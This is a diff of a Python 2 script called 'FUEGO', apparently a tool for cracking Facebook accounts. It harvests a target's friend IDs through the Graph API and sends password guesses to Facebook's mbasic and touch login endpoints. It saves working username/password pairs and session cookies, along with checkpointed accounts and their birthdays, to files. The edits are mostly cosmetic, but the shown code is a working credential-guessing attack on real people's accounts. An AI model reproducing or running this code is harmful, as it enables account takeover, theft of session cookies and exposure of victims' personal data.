@@ -53,15 +53,8 @@ bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "0
 
 def logo():
 	os.system("clear")
-	print("""\x1b[0;32m███████╗██╗   ██╗███████╗ ██████╗  ██████╗ 
-\x1b[1;32m██╔════╝██║   ██║██╔════╝██╔════╝ ██╔═══██╗
-\x1b[1;32m█████╗  ██║   ██║█████╗  ██║  ███╗██║   ██║
-\x1b[1;33m██╔══╝  ██║   ██║██╔══╝  ██║   ██║██║   ██║
-\x1b[1;33m██║     ╚██████╔╝███████╗╚██████╔╝╚██████╔╝
-\x1b[1;33m╚═╝      ╚═════╝ ╚══════╝ ╚═════╝  ╚═════╝ 
-                                           
-
-\x1b[1;32m ---------------------------------------------
+	
+	print("""\x1b[1;32m ---------------------------------------------      
 \x1b[1;32m╔════════════════════════════════════════════╗
 \x1b[1;32m║\033[1;37m Tool Author: \033[1;33mF U E G O 
 \x1b[1;32m║\033[1;37m Youtube by : \033[1;33mSOCIAL TECH                  
@@ -86,7 +79,9 @@ def login():
 		token = open("login.txt", "r")
 		menu()
 	except KeyError:
-		token = raw_input("\033[1;31m[1] L O G I N - W I T H - T O K E N \033[1;33m : ")
+		token = raw_input("\033[1;31m[1] L O G I N - W I T H - T O K E N 
+        
+ IF you dont have Token Go And Download !Get token app!\033[1;33m : ")
 		print("IF you dont have Token Go And Download !Get token app! ")
 		if token == "":
 			print("Wrong Input")
@@ -251,11 +246,11 @@ def massal():
 	except IOError:
 		exit("\033[1;31m[\033[1;31m+\033[1;31m] Token Error")
 	try:
-		tanya_Total = int(input("\033[1;37m[\033[1;32m+\033[1;37m] Enter Multi crack number [\033[1;32mOption\033[1;37m] \033[1;37 : "))
+		tanya_Total = int(input("\033[1;37m[\033[1;32m+\033[1;37m] Enter Multi crack number [\033[1;32mOption\033[1;37m]  : "))
 	except:tanya_Total=1
 	for t in range(tanya_Total):
 		t +=1
-		idt = raw_input("\033[1;37m[\033[1;32m+\033[1;37m] Target ID \033[1;37 %s : "%(t))
+		idt = raw_input("\033[1;37m[\033[1;32m+\033[1;37m] Target ID %s : "%(t))
 		try:
 			for i in requests.get("https://graph.facebook.com/%s/friends?access_token=%s"%(idt, token)).json()["data"]:
 				uid = i["id"]
@@ -304,7 +299,7 @@ def cek_ttl_cp(uid, pw):
 			ttl = ses.get("https://graph.facebook.com/%s?access_token=%s"%(uid, token)).json()["birthday"]
 			month, day, year = ttl.split("/")
 			month = bulan_ttl[month]
-			print("\r\033[0;33m[FUEGO-CP] %s|%s|%s %s %s\033[0;33m"%(uid, pw, day, month, year))
+			print("\r\033[0;33m[FUEGO-CP] %s|%s|%s %s %s"%(uid, pw, day, month, year))
 			cp.append("%s|%s"%(uid, pw))
 			open("CP/%s.txt"%(tanggal),"a").write(" + %s|%s|%s %s %s\n"%(uid, pw, day, month, year))
 	except KeyError, IOError:
@@ -390,13 +385,13 @@ def mbasic(user):
 			gaaa = ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&lwv=100&refid=8",data=kwargs)
 			if "c_user" in ses.cookies.get_dict().keys():
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print("\r\033[1;97m[FUEGO-OK] %s|%s|%s\033[1;97m"%(uid, pw, kuki))
+				print("\r\033[0;97m[FUEGO-OK] %s|%s|%s\033[0;97m"%(uid, pw, kuki))
 				ok.append("%s|%s"%(uid, pw))
 				open("OK/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
 				break
 				continue
 			elif "checkpoint" in ses.cookies.get_dict().keys():
-				print("\r\033[1;97m[FUEGO-CP] %s|%s\033[1;97m"%(uid, pw))
+				print("\r\033[0;97m[FUEGO-CP] %s|%s\033[0;97m"%(uid, pw))
 				cp.append("%s|%s"%(uid, pw))
 				open("CP/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
 				break 
@@ -442,13 +437,13 @@ def mobile(user):
 			gaaa = ses.post("https://touch.facebook.com/login/device-based/regular/login/?refsrc=https%3A%2F%2Ftouch.facebook.com%2F&lwv=100&refid=8",data=kwargs)
 			if "c_user" in ses.cookies.get_dict().keys():
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print("\r\033[1;97m[FUEGO-OK] %s|%s|%s\033[1;97m"%(uid, pw, kuki))
+				print("\r\033[0;92m[FUEGO-OK] %s|%s|%s\033[0;97m"%(uid, pw, kuki))
 				ok.append("%s|%s"%(uid, pw))
 				open("OK/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
 				break
 				continue
 			elif "checkpoint" in ses.cookies.get_dict().keys():
-				print("\r\033[1;97m[FUEGO-CP] %s|%s\033[0;97m        "%(uid, pw))
+				print("\r\033[0;97m[FUEGO-CP] %s|%s\033[0;97m        "%(uid, pw))
 				cp.append("%s|%s"%(uid, pw))
 				open("CP/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
 				break
@@ -514,23 +509,27 @@ def manual():
 	exit("\n\n # [>Program Close<]")
 
 def setting_ua():
-	print("[1] Contact Admin now for \033[1;97m[\033[1;91mpremium\033[1;97m] ")
-	print("[2] Activate \033[1;97m[\033[1;91mpremium\033[1;97m] ")
+	print("[1] Change User-Agent")
+	print("[2] Default User-Agent")
 	ua = raw_input("\n [?] Choose : ")
 	if ua =="":
 		menu()
 	elif ua == "1":
-		c_ua = raw_input(" [+] Subscribe \033[1;97m[\033[1;93mpremium\033[1;97m] : ")
+		c_ua = raw_input(" [+] Enter User-Agent : ")
+		c_ua = raw_input(" [+] IPHONE  : ")
+		c_ua = raw_input(" [+] SAMSUNG : ")
+		c_ua = raw_input(" [+] XIAOMI: ")
+		c_ua = raw_input(" [+] NOKIA : ")
+		c_ua = raw_input(" [+] LINUX: ")
 		open(".ua", "w").write(c_ua)
 		time.sleep(1)
-		raw_input("\n [!] Contact Admin On below Link , for  \033[1;97m[\033[1;91mpremium\033[1;97m]")
-
+		raw_input("\n [!] Press 'Enter' to save User-Agent")
 		menu()
-	elif ua == "1":
-		c_ua = raw_input(" [+] Subscribe \033[1;97m[\033[1;93mpremium\033[1;97m] : ")
-		open(".ua", "w").write(c_ua)
+	elif ua == "2":
+		print("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
+		os.system("rm -f .ua")
 		time.sleep(1)
-		raw_input("\n [!] Contact Admin On below Link , for  \033[1;97m[\033[1;91mpremium\033[1;97m]")
+		raw_input("\n[•] User-Agent Save Successfully")
 		menu()
 
 def buat_folder():
